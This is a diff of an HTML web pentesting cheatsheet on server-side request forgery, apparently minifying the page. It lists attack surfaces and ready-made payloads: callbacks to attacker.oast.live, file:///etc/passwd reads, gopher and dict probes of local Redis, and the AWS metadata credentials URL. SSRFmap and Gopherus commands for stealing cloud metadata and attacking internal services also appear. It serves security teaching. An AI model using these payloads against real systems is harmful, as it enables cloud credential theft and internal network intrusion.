@@ -1,346 +1,28 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SSRF | JinPwn</title><meta name="description" content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web12-ssrf/">
-<meta property="og:title" content="SSRF | JinPwn">
-<meta property="og:description" content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web12-ssrf/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="SSRF | JinPwn">
-<meta name="twitter:description" content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"The server makes HTTP requests to URLs you control. From \u0026ldquo;fetch this URL\u0026rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"SSRF | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web12-ssrf/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link is-current">SSRF</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>SSRF</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">SSRF</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Web Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link is-current">SSRF</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>The server makes HTTP requests to URLs you control. From &ldquo;fetch this URL&rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
-</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
-    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Obvious SSRF surfaces:</p>
-<ul>
-<li>&ldquo;Fetch URL&rdquo; / &ldquo;Import from URL&rdquo; / &ldquo;Webhook URL&rdquo;</li>
-<li>Profile picture URL import</li>
-<li>PDF generator that fetches assets (logos, images via URL)</li>
-<li>Open Graph link preview (chat apps, social cards)</li>
-<li>File upload via URL</li>
-<li>&ldquo;Test this connection&rdquo; / health check features</li>
-<li>RSS feed importers</li>
-<li>Image proxies (avatar caches)</li>
-<li>SAML / OIDC <code>client_id</code> / metadata URL parameters</li>
-<li>XML/JSON-LD with <code>$ref</code> or <code>@id</code> fields</li>
-</ul>
-<p>Less obvious:</p>
-<ul>
-<li>Hidden in second-order: the URL is stored, used later by a backend processor</li>
-<li>HTTP headers fetched by error tracking systems (referer-based screenshots)</li>
-<li>Webhook test buttons in admin panels</li>
-<li>Logging systems that pull avatars / data from URLs</li>
-</ul>
-<h2 id="ii-quick-detection" data-heading-permalink="true"><span class="heading-content">ii. Quick detection</span>
-    <a class="heading-permalink" href="#ii-quick-detection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Set up an OAST listener - interactsh / Burp Collaborator. Then submit your callback URL anywhere a URL is accepted:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">interactsh-client
-</span></span><span class="line"><span class="cl"><span class="c1">## Use the printed *.oast.live subdomain in payloads</span>
-</span></span></code></pre></div><p>Try in this order:</p>
-<pre tabindex="0"><code>http://attacker.oast.live/
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>SSRF | JinPwn</title><meta name=description content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/web/web12-ssrf/><meta property="og:title" content="SSRF | JinPwn"><meta property="og:description" content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web12-ssrf/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="SSRF | JinPwn"><meta name=twitter:description content="The server makes HTTP requests to URLs you control. From &amp;ldquo;fetch this URL&amp;rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"The server makes HTTP requests to URLs you control. From \u0026ldquo;fetch this URL\u0026rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"SSRF | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web12-ssrf/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Web Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/web/ class=cheatsheet-sidebar-section>Web Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-sidebar-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-sidebar-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-sidebar-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-sidebar-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-sidebar-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-sidebar-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-sidebar-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-sidebar-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-sidebar-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-sidebar-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-sidebar-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-sidebar-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class="cheatsheet-sidebar-link is-current">SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-sidebar-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-sidebar-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-sidebar-link>WEB15 Prototype Pollution</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>SSRF</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>SSRF</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Web Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/web/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-mobile-sections-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-mobile-sections-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-mobile-sections-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-mobile-sections-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-mobile-sections-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-mobile-sections-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-mobile-sections-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-mobile-sections-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-mobile-sections-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-mobile-sections-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-mobile-sections-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-mobile-sections-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class="cheatsheet-mobile-sections-link is-current">SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-mobile-sections-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-mobile-sections-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-mobile-sections-link>WEB15 Prototype Pollution</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>The server makes HTTP requests to URLs you control. From &ldquo;fetch this URL&rdquo; features to webhooks, PDF generators, link previews. Almost always escalates to cloud metadata access or internal network reconnaissance.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>T</span><span class=o>=</span>https://target.com
+</span></span></code></pre></div><h2 id=i-where-it-lives data-heading-permalink=true><span class=heading-content>i. Where it lives</span>
+<a class=heading-permalink href=#i-where-it-lives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Obvious SSRF surfaces:</p><ul><li>&ldquo;Fetch URL&rdquo; / &ldquo;Import from URL&rdquo; / &ldquo;Webhook URL&rdquo;</li><li>Profile picture URL import</li><li>PDF generator that fetches assets (logos, images via URL)</li><li>Open Graph link preview (chat apps, social cards)</li><li>File upload via URL</li><li>&ldquo;Test this connection&rdquo; / health check features</li><li>RSS feed importers</li><li>Image proxies (avatar caches)</li><li>SAML / OIDC <code>client_id</code> / metadata URL parameters</li><li>XML/JSON-LD with <code>$ref</code> or <code>@id</code> fields</li></ul><p>Less obvious:</p><ul><li>Hidden in second-order: the URL is stored, used later by a backend processor</li><li>HTTP headers fetched by error tracking systems (referer-based screenshots)</li><li>Webhook test buttons in admin panels</li><li>Logging systems that pull avatars / data from URLs</li></ul><h2 id=ii-quick-detection data-heading-permalink=true><span class=heading-content>ii. Quick detection</span>
+<a class=heading-permalink href=#ii-quick-detection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Set up an OAST listener - interactsh / Burp Collaborator. Then submit your callback URL anywhere a URL is accepted:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>interactsh-client
+</span></span><span class=line><span class=cl><span class=c1>## Use the printed *.oast.live subdomain in payloads</span>
+</span></span></code></pre></div><p>Try in this order:</p><pre tabindex=0><code>http://attacker.oast.live/
 http://attacker.oast.live:80/
 //attacker.oast.live/
 attacker.oast.live
@@ -348,88 +30,48 @@ file:///etc/passwd                  ## file scheme
 dict://127.0.0.1:6379/info          ## dict scheme (Redis)
 gopher://127.0.0.1:6379/_INFO       ## gopher scheme
 http://[::1]/                       ## IPv6 localhost
-</code></pre><p>Confirmation: hit on your interactsh listener = SSRF confirmed.</p>
-<p>If no hit but the request behaves differently with <code>http://nonexistent.invalid/</code> vs <code>http://valid-site.com/</code>, the server might be filtering but still resolving - try DNS-only via blind detection.</p>
-<h2 id="iii-tools" data-heading-permalink="true"><span class="heading-content">iii. Tools</span>
-    <a class="heading-permalink" href="#iii-tools" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="ssrfmap" data-heading-permalink="true"><span class="heading-content">SSRFmap</span>
-    <a class="heading-permalink" href="#ssrfmap" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Automated detection and exploitation against a known parameter:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/swisskyrepo/SSRFmap
-</span></span><span class="line"><span class="cl"><span class="c1">## Save request from Burp with the SSRF param marked (e.g., url=SSRF)</span>
-</span></span><span class="line"><span class="cl">python3 ssrfmap.py -r request.txt -p url -m readfiles
-</span></span><span class="line"><span class="cl">python3 ssrfmap.py -r request.txt -p url -m portscan
-</span></span><span class="line"><span class="cl">python3 ssrfmap.py -r request.txt -p url -m aws    <span class="c1">## AWS metadata</span>
-</span></span><span class="line"><span class="cl">python3 ssrfmap.py -r request.txt -p url -m gce    <span class="c1">## GCP metadata</span>
-</span></span><span class="line"><span class="cl">python3 ssrfmap.py -r request.txt -p url -m azure  <span class="c1">## Azure metadata</span>
-</span></span></code></pre></div><p>Modules: portscan, readfiles, redis, mysql, github, fastcgi, smuggle, custom, etc.</p>
-<h3 id="gopherus" data-heading-permalink="true"><span class="heading-content">Gopherus</span>
-    <a class="heading-permalink" href="#gopherus" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Generates gopher:// payloads for hitting internal services from SSRF:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/tarunkant/Gopherus
-</span></span><span class="line"><span class="cl">python3 gopherus.py --exploit redis
-</span></span><span class="line"><span class="cl">python3 gopherus.py --exploit mysql
-</span></span><span class="line"><span class="cl">python3 gopherus.py --exploit smtp
-</span></span><span class="line"><span class="cl">python3 gopherus.py --exploit fastcgi
-</span></span></code></pre></div><p>Outputs a <code>gopher://...</code> URL you paste into the SSRF param.</p>
-<h3 id="interactsh--burp-collaborator" data-heading-permalink="true"><span class="heading-content">interactsh / Burp Collaborator</span>
-    <a class="heading-permalink" href="#interactsh--burp-collaborator" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Default OAST for blind SSRF. Use the Collaborator client in Burp or the <code>interactsh-client</code> CLI.</p>
-<h2 id="iv-cloud-metadata-endpoints-the-highest-value-target" data-heading-permalink="true"><span class="heading-content">iv. Cloud metadata endpoints (the highest-value target)</span>
-    <a class="heading-permalink" href="#iv-cloud-metadata-endpoints-the-highest-value-target" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Cloud-hosted SSRF almost always escalates to full cloud compromise via metadata. Full coverage in [[Cloud Recon]] section viii, but the quick reference:</p>
-<p><strong>AWS IMDSv1</strong>:</p>
-<pre tabindex="0"><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;
-</code></pre><p><strong>AWS IMDSv2</strong> (PUT for token, then GET with header - most SSRFs can&rsquo;t do this):</p>
-<pre tabindex="0"><code>PUT /latest/api/token HTTP/1.1
+</code></pre><p>Confirmation: hit on your interactsh listener = SSRF confirmed.</p><p>If no hit but the request behaves differently with <code>http://nonexistent.invalid/</code> vs <code>http://valid-site.com/</code>, the server might be filtering but still resolving - try DNS-only via blind detection.</p><h2 id=iii-tools data-heading-permalink=true><span class=heading-content>iii. Tools</span>
+<a class=heading-permalink href=#iii-tools aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=ssrfmap data-heading-permalink=true><span class=heading-content>SSRFmap</span>
